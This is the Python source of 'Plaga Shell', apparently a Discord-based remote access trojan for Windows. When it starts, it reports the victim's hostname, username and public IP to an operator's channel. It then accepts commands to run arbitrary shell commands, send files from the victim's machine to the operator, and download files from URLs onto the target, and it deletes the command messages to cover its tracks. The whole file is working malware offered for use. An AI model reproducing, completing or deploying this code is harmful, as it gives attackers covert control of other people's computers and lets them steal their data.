import os, getpass, discord, requests, random, asyncio, socket, shutil
from discord.ext import commands


def req_ip():
    ip = requests.get("https://api.ipify.org").text
    return ip

def hex():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

Plaga = commands.Bot(description='Plaga Shell', command_prefix='>', bot=True)
Plaga.remove_command('help')
loop = asyncio.get_event_loop()

@Plaga.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send('Command not found!')
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send('Missing argument!')

@Plaga.event
async def on_ready():
    hostname = socket.gethostname()
    channel = Plaga.get_channel(1111111111111) #CHANGE THIS
    user = getpass.getuser()
    embed = discord.Embed(title=':white_check_mark: Plaga Connection', description='** **', colour=hex())
    embed.add_field(name=f':computer:  Hostname: `{hostname}`', value='** **', inline=False)
    embed.add_field(name=f':man:  User: `{user}`', value='** **', inline=False)
    embed.add_field(name=':globe_with_meridians:  IP: `' + req_ip() + '`', value='** **', inline=False)
    embed.add_field(name=':keyboard:  Prefix: `?`', value='** **', inline=False)

    await channel.send(embed=embed)

@Plaga.command()
async def cmd(ctx, *, cmds):
    await ctx.message.delete()
    try:
        output = os.popen(f'{cmds}').read()
        os.system(f'{cmds} > C:\\ProgramData\cmd.txt')
        f = open('C:\\ProgramData\cmd.txt', 'w')
        f.write(output)
        f.close()
        await ctx.send(file=discord.File(r'C:\\ProgramData\cmd.txt'))
        os.remove('C:\\ProgramData\cmd.txt')
    except Exception:
        await ctx.send('`[!]` Could not execute command')

@Plaga.command()
async def download(ctx, *, file):
    user = getpass.getuser()
    await ctx.message.delete()
    if file == None:
        await ctx.send('`[!]` You need to specify a file')
        await ctx.send(f'`[?]` Syntax: download C://Users/{user}/Desktop/Test.txt')
    else:
        try:
            await ctx.send(file=discord.File(file))
            await ctx.send('`[+]` File downloaded')
        except Exception:
            await ctx.send(f'`[!]` Could not download {file}')

@Plaga.command()
async def upload(ctx, url_path, *, file_name):
    await ctx.message.delete()
    try:
        os.popen(f'curl {url_path} -o C:\\ProgramData\\{file_name}')
        await ctx.send(f'`[+]` {file_name} uploaded to target')
    except Exception:
        await ctx.send(f'`[!]` Could not upload file to target')

loop.create_task(Plaga.start('TOKEN-HERE')) #CHANGE THIS

try:
    loop.run_forever()
except:
    loop.stop()